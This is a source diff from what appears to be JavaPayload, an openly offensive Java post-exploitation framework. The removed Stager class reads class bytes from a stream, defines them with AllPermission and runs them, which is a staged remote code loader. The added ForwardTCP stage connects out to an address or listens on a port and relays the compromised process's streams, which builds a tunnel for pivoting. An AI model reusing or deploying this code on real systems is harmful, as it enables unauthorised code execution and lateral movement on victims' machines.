@@ -32,50 +32,67 @@
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-package javapayload.stager;
+package javapayload.stage;
 
 import java.io.DataInputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
-import java.io.PrintStream;
-import java.net.URL;
-import java.security.AllPermission;
-import java.security.CodeSource;
-import java.security.Permissions;
-import java.security.ProtectionDomain;
-import java.security.cert.Certificate;
+import java.net.ServerSocket;
+import java.net.Socket;
+import java.net.SocketException;
 
-public abstract class Stager extends ClassLoader {
+public class ForwardTCP implements Stage {
 
-	public Stager targetStager = null;
-	
-	protected void bootstrap(InputStream rawIn, OutputStream out, String[] parameters) throws Exception {
-		if (targetStager != null) {
-			targetStager.bootstrap(rawIn, out, parameters);
-			return;
-		}
-		try {
-			final DataInputStream in = new DataInputStream(rawIn);
-			Class clazz;
-			final Permissions permissions = new Permissions();
-			permissions.add(new AllPermission());
-			final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
-			int length = in.readInt();
-			do {
-				final byte[] classfile = new byte[length];
-				in.readFully(classfile);
-				resolveClass(clazz = defineClass(null, classfile, 0, length, pd));
-				length = in.readInt();
-				if (length == 0) {
-					break;
-				}
-			} while (length > 0);
-			final Object stage = clazz.newInstance();
-			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, parameters });
-		} catch (final Throwable t) {
-			t.printStackTrace(new PrintStream(out));
-		}
+	public void start(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
+		runForwarder(in, out, parameters, true);
 	}
 
-	public abstract void bootstrap(String[] parameters) throws Exception;
+	public static void runForwarder(InputStream in, OutputStream out, String[] parameters, boolean stage) throws Exception {
+		String address = null;
+		for (int i = 0; i < parameters.length; i++) {
+			if (parameters[i].equals("--")) {
+				// separator found. The next parameter will be the module name,
+				// and all remaining parameters are for us. parameters[i+2] is
+				// the address for the stager, parameters[i+3] for the stage.
+				address = parameters[i + (stage ? 3 : 2)];
+				break;
+			}
+		}
+		if (address == null)
+			throw new RuntimeException("No address given");
+		Socket socket;
+		int pos = address.indexOf(':');
+		if (pos != -1) {
+			String host = address.substring(0, pos);
+			int port = Integer.parseInt(address.substring(pos + 1));
+			socket = new Socket(host, port);
+		} else {
+			ServerSocket ss = new ServerSocket(Integer.parseInt(address));
+			socket = ss.accept();
+			ss.close();
+		}
+
+		// now let's go
+		if (stage)
+			out.write(0);
+
+		try {
+			new StreamForwarder(socket.getInputStream(), out, null).start();
+			StreamForwarder.forward(in, socket.getOutputStream());
+		} catch (SocketException ex) {
+			// ignore
+		} catch (Exception e) {
+			if (!stage)
+				throw e;
+			// we may not output it in the stage as it will mess with the socket
+			// stream
+			e.printStackTrace();
+		} finally {
+			try {
+				out.close();
+			} catch (Throwable t) {
+			}
+			socket.close();
+		}
+	}
 }
